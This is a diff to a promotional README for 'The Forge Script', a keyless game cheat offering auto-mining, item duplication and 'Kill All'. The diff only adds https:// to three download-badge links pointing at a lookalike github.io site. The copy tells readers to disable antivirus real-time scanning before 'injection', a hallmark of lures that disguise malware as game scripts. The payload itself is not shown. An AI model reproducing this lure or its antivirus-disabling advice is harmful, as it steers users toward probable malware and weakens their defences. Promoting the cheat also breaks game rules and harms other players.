@@ -6,7 +6,7 @@
 
 The Forge Script is the most powerful all-in-one automation tool built for serious grinders who refuse to waste hours on repetitive tasks. Whether you need Auto Quest loops, Auto Mine routines, or the legendary Dupe Boss method, The Forge Script delivers everything inside a single lightweight payload. This keyless release means zero waiting — just paste and execute. Designed with stability and speed at its core, The Forge Script Pastebin edition has been tested across every major executor on the market, and it handles anti-cheat updates faster than anything else available right now. If you are looking for the Best The Forge Script Keyless experience in 2026, this is it.
 
-[![Download The Forge Script](https://img.shields.io/badge/Download_The_Forge_Script-Latest_Build-blueviolet?style=for-the-badge&logo=rocket)](thefrgescript.github.io/theforge/)
+[![Download The Forge Script](https://img.shields.io/badge/Download_The_Forge_Script-Latest_Build-blueviolet?style=for-the-badge&logo=rocket)](https://thefrgescript.github.io/theforge/)
 
 ---
 
@@ -55,7 +55,7 @@ The Forge Script stands apart because it combines every grind feature into one u
 
 Getting started with The Forge Script takes less than two minutes regardless of your platform. Below you will find step-by-step instructions for Windows, Android, and iOS. Make sure your executor is updated to its latest version before loading The Forge Script Pastebin code, and always disable antivirus real-time scanning on desktop to prevent false-positive blocks during injection.
 
-[![Download The Forge Script](https://img.shields.io/badge/Download_The_Forge_Script-Free_Access-blueviolet?style=for-the-badge&logo=download)](thefrgescript.github.io/theforge/)
+[![Download The Forge Script](https://img.shields.io/badge/Download_The_Forge_Script-Free_Access-blueviolet?style=for-the-badge&logo=download)](https://thefrgescript.github.io/theforge/)
 
 ---
 
@@ -328,7 +328,7 @@ The Forge Script is not just another automation tool — it is a complete grindi
 
 Whether you are a new player trying to catch up or a veteran squeezing every last drop of efficiency out of endgame content, The Forge Script delivers real results. Dupe Ore The Forge Script, The Forge Script Dupe Boss, and Kill All are just the beginning of what this package offers. Every setting is customizable, every module is toggleable, and the whole thing runs lighter than most people expect. If you have been searching for the Best The Forge Script Keyless solution that actually works in 2026, your search ends right here.
 
-[![Download The Forge Script](https://img.shields.io/badge/Download_The_Forge_Script-Get_Started_Now-blueviolet?style=for-the-badge&logo=rocket)](thefrgescript.github.io/theforge/)
+[![Download The Forge Script](https://img.shields.io/badge/Download_The_Forge_Script-Get_Started_Now-blueviolet?style=for-the-badge&logo=rocket)](https://thefrgescript.github.io/theforge/)
 
 ---
 
